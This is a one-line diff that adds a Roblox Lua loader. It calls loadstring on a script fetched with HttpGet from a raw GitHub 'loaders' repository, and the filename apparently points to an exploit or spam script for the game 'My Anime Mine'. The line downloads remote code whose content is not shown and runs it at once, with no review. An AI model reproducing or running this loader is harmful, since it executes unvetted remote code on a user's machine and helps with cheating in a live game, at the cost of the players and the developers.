@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/my-anime-mine-spam3-ndbxoj2pfidc6x.lua"))()
